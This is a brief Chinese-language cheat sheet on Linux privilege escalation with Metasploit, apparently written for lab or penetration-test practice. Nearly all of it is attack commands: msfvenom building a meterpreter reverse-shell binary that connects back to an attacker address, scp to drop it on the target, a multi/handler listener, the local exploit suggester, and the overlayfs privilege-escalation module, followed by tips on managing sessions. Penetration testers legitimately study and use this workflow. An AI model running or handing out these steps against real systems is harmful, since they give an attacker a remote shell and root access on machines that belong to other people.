# msf提权
1. 首先攻击机生成反弹shell马
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=11.1.1.130 LPORT=4444 -f elf > p.elf

    chmod 777 p.elf
2. scp 命令传送至linux
    scp ./p.elf a@靶机ip:/tmp
3. 打开msf并配置
    use exploit/multi/handler
    set payload  linux/x64/meterpreter/reverse_tcp
    set lhost 本机ip
    run
    background
    use post/multi/recon/local_exploit_suggester
    set session 1
    run
4. 扫描到的payload一个个尝试
    use exploit/linux/local/overlayfs_priv_esc
    set lhost 本机ip
    set session 1
    run
+ tips

background之后可以通过sessions进行查看多个放置到后台的会话，展示会话
    sessions

切换会话
    sessions -i (id)